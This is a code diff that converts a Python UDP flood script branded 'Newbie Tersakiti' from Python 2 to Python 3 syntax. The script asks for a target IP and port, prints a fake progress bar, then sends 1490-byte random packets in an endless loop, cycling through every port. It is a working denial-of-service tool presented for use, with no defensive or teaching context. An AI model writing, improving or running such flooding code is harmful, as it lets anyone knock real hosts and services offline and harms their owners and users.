@@ -17,28 +17,26 @@ bytes = random._urandom(1490)
 #############
 os.system("clear")
 os.system("figlet Newbie Tersakiti")
-print "Author   : Newbie Tersakiti"
-print "TEAM     : Newbie Tersakiti"
-print "Tingkat  : Newbie Tersakiti"
-ip = raw_input("IP Target : ")
+
+ip = input("IP Target : ")
 port = input("Port       : ")
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print ("[                    ] 0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+print ("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+print ("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+print ("[===============     ] 75%")
 time.sleep(5)
-print "[====================] 100%"
+print ("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
